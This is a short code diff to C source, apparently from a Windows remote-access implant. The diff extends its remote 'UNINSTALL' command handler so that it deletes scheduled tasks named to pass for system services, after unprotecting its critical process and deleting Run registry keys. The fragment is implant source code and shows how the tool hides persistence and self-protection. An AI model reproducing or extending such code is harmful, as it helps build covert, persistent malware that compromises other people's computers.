@@ -345,7 +345,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         /* 3. Remove critical from current process */
         sys_unprotect_process();
         
-        /* 4. Delete registry keys */
+        /* 4. Delete registry keys (legacy cleanup) */
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_CURRENT_USER,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -357,7 +357,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             RegCloseKey(hKey);
         }
         
-        /* 5. Exit */
+        /* 5. Delete scheduled tasks */
+        sys_run_command("schtasks /delete /tn \"ElevationService\" /f");
+        sys_run_command("schtasks /delete /tn \"CrashHandler\" /f");
+        sys_run_command("schtasks /delete /tn \"NotifyService\" /f");
+        
+        /* 6. Exit */
         result = "[UNINSTALL complete — all shadows killed, persistence removed, exiting]";
         net_send_packet(sock, result);
         ExitProcess(0);
